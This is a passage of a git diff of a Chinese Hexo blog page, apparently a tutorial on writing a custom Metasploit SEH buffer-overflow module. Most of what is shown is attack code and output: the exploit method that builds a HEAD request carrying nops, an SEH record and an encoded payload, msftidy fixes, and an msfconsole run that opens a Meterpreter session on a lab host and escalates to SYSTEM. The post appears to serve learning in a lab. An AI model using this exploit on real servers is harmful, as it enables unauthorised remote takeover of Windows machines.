class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">exploit</span></span><br><span class="line">    connect</span><br><span class="line">    weapon=<span class="string">&quot;HEAD &quot;</span></span><br><span class="line">    weapon&lt;&lt;make_nops(target[<span class="string">&#x27;Offset&#x27;</span>])</span><br><span class="line">    weapon&lt;&lt;generate_seh_record(target.ret)</span><br><span class="line">    weapon&lt;&lt;make_nops(<span class="number">19</span>)</span><br><span class="line">    weapon&lt;&lt;payload.encoded</span><br><span class="line">    weapon&lt;&lt;<span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span></span><br><span class="line">    sock.put(weapon)</span><br><span class="line">    handler</span><br><span class="line">    disconnect</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
 <p><strong>注意：HEAD后面和HTTP前面都是有空格的！！！</strong></p>
 <h3 id="代码简要分析">2、代码简要分析</h3>
 <h4 id="target">（1）Target</h4>
@@ -488,37 +376,10 @@ end</code></pre>
 <li>然后调用handler方法来检查该尝试是否成功。如果成功，我们将获得控制目标的权限。</li>
 </ul>
 <h3 id="代码调试所遇问题">3、代码调试所遇问题</h3>
-<pre><code>root@kali:/usr/share/metasploit-framework/tools/dev# ./msftidy.rb /usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb 
-/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Explicitly requiring/loading msf/core is not necessary  #删掉require &#39;msf/core&#39;即可
-/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!   
-/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [ERROR] Incorrect disclosure date format  #正确：2021-09-26，错误：2021-9-26
-/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Please use &#39;MetasploitModule&#39; as the class name (you used Metasploit4)  #将Metasploit4改为MetasploitModule
-/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb:27 - [WARNING] Spaces at EOL
-root@kali:/usr/share/metasploit-framework/tools/dev#</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/dev<span class="comment"># ./msftidy.rb /usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb </span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Explicitly requiring/loading msf/core is not necessary  <span class="comment">#删掉require &#x27;msf/core&#x27;即可</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [INFO] No CVE references found. Please check before you land!   </span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [ERROR] Incorrect disclosure <span class="built_in">date</span> format  <span class="comment">#正确：2021-09-26，错误：2021-9-26</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb - [WARNING] Please use <span class="string">&#x27;MetasploitModule&#x27;</span> as the class name (you used Metasploit4)  <span class="comment">#将Metasploit4改为MetasploitModule</span></span><br><span class="line">/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test/seh_attack_by_z9m8r8.rb:27 - [WARNING] Spaces at EOL</span><br><span class="line">root@kali:/usr/share/metasploit-framework/tools/dev<span class="comment">#</span></span><br></pre></td></tr></table></figure>
 <h3 id="msf-运行测试">4、msf 运行测试</h3>
-<pre><code>root@kali:/# msfconsole
-…………
-…………
-msf5 &gt; use exploit/windows/z9m8r8_test/seh_attack_by_z9m8r8 
-msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; set payload windows/meterpreter/bind_tcp
-payload =&gt; windows/meterpreter/bind_tcp
-msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; set rhost 10.10.10.131
-rhost =&gt; 10.10.10.131
-msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; set rport 90
-rport =&gt; 90
-msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; exploit 
-
-[*] Started bind TCP handler against 10.10.10.131:4444
-[*] Sending stage (179779 bytes) to 10.10.10.131
-[*] Meterpreter session 1 opened (10.10.10.148:38999 -&gt; 10.10.10.131:4444) at 2021-09-25 22:16:28 -0400
-
-meterpreter &gt; getuid
-Server username: DH-CA8822AB9589\Administrator
-meterpreter &gt; getsystem 
-...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-meterpreter &gt;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># msfconsole</span></span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/seh_attack_by_z9m8r8 </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rhost 10.10.10.131</span><br><span class="line">rhost =&gt; 10.10.10.131</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; <span class="built_in">set</span> rport 90</span><br><span class="line">rport =&gt; 90</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/seh_attack_by_z9m8r8) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.131:4444</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.131</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.148:38999 -&gt; 10.10.10.131:4444) at 2021-09-25 22:16:28 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: DH-CA8822AB9589\Administrator</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
 <p><strong>参考自：</strong></p>
-<p>《精通Metasploit渗透测试 第2版》</p>
 <p>https://blog.csdn.net/l1028386804/article/details/86506457</p>
 
     </div>
@@ -598,7 +459,7 @@ meterpreter &gt;</code></pre>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">10:13</span>
+    <span title="站点阅读时长">10:14</span>
   </span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
